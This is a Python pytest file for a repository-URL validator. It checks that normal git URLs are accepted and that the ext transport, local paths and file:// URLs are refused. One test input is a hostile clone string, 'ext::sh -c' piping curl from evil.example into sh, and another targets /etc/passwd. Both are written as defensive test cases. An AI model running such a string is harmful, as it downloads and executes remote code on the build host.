"""Which clone URLs are allowed."""

from __future__ import annotations

import pytest

from forge.domain.errors import InvalidRequest
from forge.domain.repo_url import validate_repo_url


@pytest.mark.parametrize(
    "url",
    [
        "https://github.com/owner/repo.git",
        "http://git.internal/repo.git",
        "ssh://git@github.com/owner/repo.git",
        "git@github.com:owner/repo.git",
    ],
)
def test_ordinary_urls_are_accepted(url):
    assert validate_repo_url(f"  {url} ") == url


def test_the_ext_transport_is_refused():
    """`git clone 'ext::sh -c ...'` runs the command. An allowlist of
    transports is the difference between a clone and a shell on the build
    host."""
    with pytest.raises(InvalidRequest):
        validate_repo_url("ext::sh -c 'curl evil.example/x.sh | sh'")


@pytest.mark.parametrize(
    "url", ["file:///etc/passwd", "/srv/repos/thing.git", "ftp://x/y", ""]
)
def test_other_transports_and_local_paths_are_refused(url):
    with pytest.raises(InvalidRequest):
        validate_repo_url(url)
